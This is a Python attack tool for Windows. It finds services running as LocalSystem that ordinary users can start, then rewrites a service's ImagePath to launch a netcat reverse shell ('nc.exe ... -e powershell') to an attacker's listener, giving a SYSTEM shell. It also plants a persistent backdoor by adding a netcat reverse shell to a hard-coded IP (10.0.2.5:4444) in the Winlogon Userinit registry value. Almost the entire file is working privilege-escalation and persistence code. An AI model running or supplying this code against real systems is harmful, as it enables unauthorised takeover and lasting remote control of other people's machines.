import os,subprocess,winreg,re,win32serviceutil,argparse,wget

def checkStartup(service):
    try:
        sddlString = str(subprocess.check_output(f"sc sdshow {service}",shell=True))
        m = re.search(".RP[A-Z]*;;;AU",sddlString)
        if m is not None:
            return True
        return False
    except:        
        return False

def exploitableServices():
    regHive = winreg.ConnectRegistry(None,winreg.HKEY_LOCAL_MACHINE)
    with winreg.OpenKey(regHive,r"SYSTEM\\CurrentControlSet\\Services",0,winreg.KEY_READ) as regKey:
        index = 0
        services = []
        while True:
            try:
                x = winreg.EnumKey(regKey,index)
                services.append(x)
                index+=1
            except:
                break
    expServices = []
    for service in services:
        if(checkStartup(service)):
            keyPath = "SYSTEM\\CurrentControlSet\\Services\\{}".format(service)
            with winreg.OpenKey(regHive,keyPath,0,winreg.KEY_READ) as regKey:
                try:
                    queryObjectName = winreg.QueryValueEx(regKey,'ObjectName')
                    queryStart = winreg.QueryValueEx(regKey,'Start')
                    queryImagePath = winreg.QueryValueEx(regKey,'ImagePath')
                    if (queryObjectName[0] == 'LocalSystem' and queryStart[0] == 3 and queryImagePath):
                        expServices.append(service)
                except:
                    pass
    return expServices

def getShell(service,ip,port):
    try:
        regHive = winreg.ConnectRegistry(None,winreg.HKEY_LOCAL_MACHINE)
        keyPath = f"SYSTEM\\CurrentControlSet\\Services\\{service}"
        try:
            with winreg.OpenKey(regHive,keyPath,0,winreg.KEY_SET_VALUE) as regKey:
                winreg.SetValueEx(regKey,'ImagePath', 1, winreg.REG_EXPAND_SZ,f"C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -d {ip} {port} -e powershell")
                print(f"Service {service} has been replaced with a backdoor.Now starting service, make sure you have a shell ready!")
                try:
                    subprocess.call(f"powershell.exe Start-Service {service}",shell=True)
                except:
                    subprocess.call(f"powershell.exe Stop-Service {service} -Force",shell=True)
                    subprocess.call(f"powershell.exe Start-Service {service}",shell=True)
        except:
            print("The service entered doesn't exist!")               
    except OSError:
        print("Encountered an error! You don't have the permission to write the registry value") 

def deployHiddenBackdoor(ip,port):
    try:
        print("Trying to deploy a hidden backdoor ...")
        regHive = winreg.ConnectRegistry(None,winreg.HKEY_LOCAL_MACHINE)
        with winreg.OpenKey(regHive,r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\winlogon",0,winreg.KEY_SET_VALUE) as regKey:
            winreg.SetValueEx(regKey,'Userinit', 1, winreg.REG_SZ,f"C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -d 10.0.2.5 4444 -e powershell,C:\\Windows\\system32\\userinit.exe")
        print("Backdoor deployed successfully!")
    except OSError:
        print("Encountered an error! You don't have the permission to write the registry value")

def enumVulnServices():
    vulnServices = exploitableServices()
    for service in vulnServices:
        print(service)
    print("\n")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-e","--enum",action="store_true",help="Enumerate vulnerable services")
    parser.add_argument("-s","--shell",action="store",type=str,nargs='?',metavar='service',help="Get a shell as SYSTEM. PLEASE SELECT A VULNERABLE SERVICE ONLY.")
    parser.add_argument("-b","--backdoor",action="store_true",help="Deploy a persistent backdoor on the target")
    parser.add_argument("--ip",action="store",help="ip of the listener, the attacker's ip",nargs=1,type=str,required=True)
    parser.add_argument("-p","--port",action="store",help="listening port",nargs=1,type=str,required=True)
    args = parser.parse_args()

    if args.enum:
        enumVulnServices()
    if args.shell:
        getShell(args.shell,args.ip[0],args.port[0])   
    if args.backdoor:
        deployHiddenBackdoor(args.ip,args.port)

if __name__ == "__main__":
    main()
